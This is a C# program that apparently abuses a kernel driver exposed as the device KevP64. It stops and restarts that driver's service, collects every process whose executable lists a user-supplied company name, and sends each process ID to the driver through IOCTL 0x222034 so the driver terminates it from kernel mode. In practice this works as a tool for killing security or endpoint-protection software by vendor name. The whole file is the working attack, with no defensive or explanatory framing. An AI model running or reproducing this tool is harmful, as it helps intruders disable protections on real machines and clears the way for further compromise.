using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Runtime.InteropServices;
using System.Collections.Generic;

class Program
{
    private const uint TERMINATE_IOCTL = 0x222034;

    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes,
        uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern bool DeviceIoControl(IntPtr deviceHandle, uint ioctlCode, ref uint inputBuffer, uint inputBufferSize,
        ref uint outputBuffer, uint outputBufferSize, out uint bytesReturned, IntPtr overlapped);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    static bool CheckProcess(uint processId)
    {
        using (var process = System.Diagnostics.Process.GetProcessById((int)processId))
        {
            return process != null;
        }
    }

    static List<uint> GetProcessIdsByCompanyName(string companyName)
    {
        var processIds = new List<uint>();
        var processes = Process.GetProcesses();
        foreach (var process in processes)
        {
            try
            {
                var processModule = process.MainModule;
                if (processModule != null && processModule.FileVersionInfo.CompanyName == companyName)
                {
                    processIds.Add((uint)process.Id);
                }
            }
            catch (Exception)
            {

            }
        }
        return processIds;
    }

    static void Main(string[] args)
    {
        string serviceName = "KevP64";

        while (true)
        {
            StopService(serviceName);
            StartService(serviceName);

            Console.WriteLine("Enter the company name of the processes:");
            string companyName = Console.ReadLine();

            List<uint> processIds = GetProcessIdsByCompanyName(companyName);
            if (processIds.Count == 0)
            {
                Console.WriteLine("Can't find any process related, try again");
                return;
            }

            IntPtr deviceHandle = CreateFile("\\\\.\\KevP64", 0xC0000000, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            if (deviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open handle to the driver! Verify if the driver is loaded and running as Carrie.");
                return;
            }

            try
            {
                foreach (var processId in processIds)
                {
                    uint TempPID = processId;
                    uint input = TempPID;
                    uint output = 0;
                    uint bytesReturned;

                    Console.WriteLine($"Terminating the PID: {TempPID}...");
                    if (!DeviceIoControl(deviceHandle, TERMINATE_IOCTL, ref TempPID, sizeof(uint), ref output, sizeof(uint), out bytesReturned, IntPtr.Zero))
                    {
                        Console.WriteLine($"FAILURE: {TempPID}. Erro: 0x{Marshal.GetLastWin32Error():X}");
                    }
                    else
                    {
                        Console.WriteLine($"PID {TempPID} terminated!");
                    }
                }
            }
            finally
            {
                CloseHandle(deviceHandle);
            }
        }
    }

    static void StopService(string serviceName)
    {
        using (ServiceController serviceController = new ServiceController(serviceName))
        {
            if (serviceController.Status != ServiceControllerStatus.Stopped)
            {
                serviceController.Stop();
                serviceController.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(10));
            }
        }
    }

    static void StartService(string serviceName)
    {
        using (ServiceController serviceController = new ServiceController(serviceName))
        {
            if (serviceController.Status != ServiceControllerStatus.Running)
            {
                serviceController.Start();
                serviceController.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
            }
        }
    }
}